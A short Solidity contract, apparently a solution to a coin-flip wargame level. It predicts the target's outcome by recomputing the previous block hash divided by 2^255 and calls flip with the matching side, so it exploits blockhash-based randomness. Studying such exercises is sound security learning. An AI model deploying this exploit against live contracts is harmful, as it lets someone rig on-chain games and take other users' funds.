// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool) external;
}

contract FlipGuesser {
    constructor(address coinFlipAddress) {
        _interface = ICoinFlip(coinFlipAddress);
    }

    using SafeMath for uint256;
    ICoinFlip public _interface;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 public blockValue;
    bool public side;

    function guess() public {
        blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 answer = blockValue.div(FACTOR);
        side = answer == 1 ? true : false;
        _interface.flip(side);
    }
}
